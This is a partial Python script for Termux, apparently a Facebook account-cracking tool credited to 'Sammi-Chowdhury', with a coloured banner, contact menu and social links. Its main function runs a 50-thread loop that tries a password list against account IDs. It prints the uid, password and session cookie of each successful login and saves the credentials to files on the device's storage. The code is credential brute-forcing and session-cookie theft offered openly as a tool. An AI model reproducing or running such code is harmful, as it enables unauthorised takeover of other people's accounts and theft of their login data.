...
def o():
    ...
    print(" \033[38;5;196m[\033[38;5;195mB\033[38;5;196m]\033[38;5;195m Contact Admin")
    print(" \033[38;5;196m[\033[38;5;195mC\033[38;5;196m]\033[38;5;195m WhatsApp 01400926791")
    print(" \033[38;5;196m[\033[38;5;195mD\033[38;5;196m]\033[38;5;195m Sammi-109-Cyber")
    ...
    if shamim == 'A':
        shamim()
    if shamim == 'B':
        os.system('xdg-open https://www.facebook.com/Xammi.vau109')
        return None
    if shamim == 'C':
        os.system('xdg-open https://facebook.com/groups/551365756758487/')
        return None
    if shamim == 'D':
        os.system('xdg-open https://github.com/Sammi-109-Cyber')
        return None
    if shamim == 'E':
        os.system('exit')
        return None
...
logo = ("""
 ...
 \033[38;5;46m×××××××××××××××××××××××××××××××××××××××××××××××××
 \033[38;5;46m|     \033[38;5;196m[\033[38;5;45m✓\033[38;5;196m] \033[38;5;195mCREATED BY\033[38;5;196m   :  \033[38;5;195mSAMMI-CHOWDHURY\033[38;5;46m|
 \033[38;5;46m|     \033[38;5;196m[\033[38;5;45m✓\033[38;5;196m] \033[38;5;195mFACEBOK      \033[38;5;196m: \033[38;5;195m SAMMI CHOWDHURY\033[38;5;46m|
 \033[38;5;46m|     \033[38;5;196m[\033[38;5;45m✓\033[38;5;196m] \033[38;5;195mGITHUB       \033[38;5;196m:  \033[38;5;195mSammi-109-Cyber\033[38;5;46m|
 ...
 \033[38;5;46m|     \033[38;5;196m[\033[38;5;45m✓\033[38;5;196m] \033[38;5;195mTEAM         \033[38;5;196m:  \033[38;5;195mSammi-Cyber\033[38;5;46m|
 ...
 \033[38;5;196m[\033[38;5;45m•\033[38;5;196m]\033[38;5;195m Sammi TERMUX HELPING ZONE....
 \033[38;5;46m×××××××××××××××××××××××××××××××××××××××××××××××××""")
def linex():
	print(' \033[38;5;46m×××××××××××××××××××××××××××××××××××××××××××××××××')
loop = 0
...
def shamim():
    ...
    with ThreadPool(max_workers=50) as setu:
        ...
        print(f' \033[38;5;196m[\033[38;5;45m•\033[38;5;196m]\033[38;5;195m TOOL OWNER \033[1;97m: \033[38;5;45m SAMMI-CHOWDHURY')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('    \033[38;5;45m[Sammi-OK💉] '+uid+' | '+ps+'\033[38;5;46m'+asha(uid)+'\n    \033[38;5;196m[Usar Agent🤖]\033[38;5;195m'+pro+' \033[1;91m ')
                print(f'    \033[38;5;46m[COOKIE🍪] \033[38;5;192m'+coki)
                cek_apk(session,coki)
                open('/sdcard/Sammi-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                #print('\r\r\33[1;31m [Sammi-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/Sammi-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r \33[1;93m[%s. 3[0m/%s\33[1;93m]\033[1;97mOK-\033[38;5;46m%s'%(H,loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
